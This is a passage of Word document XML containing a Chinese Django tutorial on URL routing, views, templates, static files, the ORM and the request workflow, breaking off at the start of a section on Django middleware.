    </w:p>
    <w:p w14:paraId="3C99DB90"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 xml:space="preserve">    url(r</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'^polls/$'</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, views.index),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758909D0"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254A5CFC" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00DC672E" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAF7EF"/>
        <w:spacing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这样当请求链接为</w:t>
      </w:r>
      <w:hyperlink r:id="rId129" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00DC672E">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="6466B3"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>http://127.0.0.1:8000/polls/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>时，就会用</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>views.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的函数</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>index()</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来处理请求。现在</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知道由</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来处理请求了，那么</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>需要做哪些工作呢？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DE0318"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lastRenderedPageBreak/>
        <w:t>它需要加载返回内容的模板，这里比如说是</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>index.html</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50297780"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def index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DA43C9"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>return</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> render(request,</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'index.html'</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3C2E5A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAF7EF"/>
        <w:spacing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在模板方面，模板文件就是返回页面的一个骨架，我们可以在模板中指定需要的静态文件，也可以在模板中使用一些参数和简单的逻辑语句，这样就可以将其变为用户最终看到的丰满的页面了。</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D677181" w14:textId="7FCC5DEC" w:rsidR="00870C85" w:rsidRPr="00DC672E" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAF7EF"/>
        <w:spacing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要使用静态文件，比如说</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>css</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javascript</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>等，只需要用</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>{% load staticfiles %}</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来声明一下，然后直接引用即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547A2287"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在数据库方面，</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给我们封装了数据库的读写操作，我们不需要用</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句去查询、更新数据库等，我们要做的是用</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的方式定义数据库结构</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在</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>model.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>里面定义数据库</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，然后用</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的方式去读写内容。至于连接数据库、关闭数据库这些工作交给</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去替你完成吧。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8B6583"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至此，整个框架的简单介绍结束。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC255F1" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00DC672E" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAF7EF"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>二、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C67C210" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00DC672E" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAF7EF"/>
        <w:spacing w:before="150" w:after="150"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B84E353" wp14:editId="5411AFFB">
            <wp:extent cx="6046678" cy="2127342"/>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3780" cy="2154468"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="438CAC8A"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这张图片是我对</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工作流程一个大致的分析。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C403FA"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在你写好一个完整的</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后，它的工作流程应该是这样的：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D93921"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1.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>用户在客户端浏览器输入</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>地址，通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>get/post</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求方式，向服务端发起请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30718061"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2.django</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>服务端接收到客户端请求，通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>urls.py</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中地址与处理函数之间的一一对应，找到对应的视图函数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D56D778"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3.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>开始执行对应视图函数中的逻辑，通过与</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>models</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>交互，进行数据库的</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CRUD</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已经封装好了数据库操作方法，不需要额外的</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句在进行数据库操作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5794BBFB"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4.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>templates</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>交互，将参数返回到前端页面，并通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>templates</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>进行</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>html</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>页面渲染。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFC7E85"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这是我学习</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框架后对它的工作流程的简单了解，如果有不对的地方，欢迎指正。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="148EBB91" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00112B23" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FAF7EF"/>
        <w:spacing w:before="150" w:after="150"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC672E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="393939"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="45991F4D" wp14:editId="1E52B520">
            <wp:extent cx="6544310" cy="271459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60919" cy="2721489"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="42BE57E8" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00112B23" w:rsidRDefault="00D96E02" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="0" w:color="999999"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="480" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="43"/>
          <w:szCs w:val="43"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId132" w:history="1">
        <w:r w:rsidR="00870C85" w:rsidRPr="00112B23">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="339900"/>
            <w:kern w:val="36"/>
            <w:sz w:val="43"/>
            <w:szCs w:val="43"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>django</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00112B23">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="339900"/>
            <w:kern w:val="36"/>
            <w:sz w:val="43"/>
            <w:szCs w:val="43"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>中间件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B3F3BE5" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="76" w:name="_labelTop"/>
      <w:bookmarkEnd w:id="76"/>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>阅读目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E98726" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00D96E02" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:ind w:left="450"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId133" w:anchor="_label0" w:history="1">
        <w:r w:rsidR="00870C85" w:rsidRPr="000A3629">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>一、什么是中间件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="10F2972C" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00D96E02" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:wordWrap w:val="0"/>
        <w:ind w:left="450"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId134" w:anchor="_label1" w:history="1">
        <w:r w:rsidR="00870C85" w:rsidRPr="000A3629">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:szCs w:val="21"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>二、中间件有什么用</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="459E28B5" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00D96E02" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
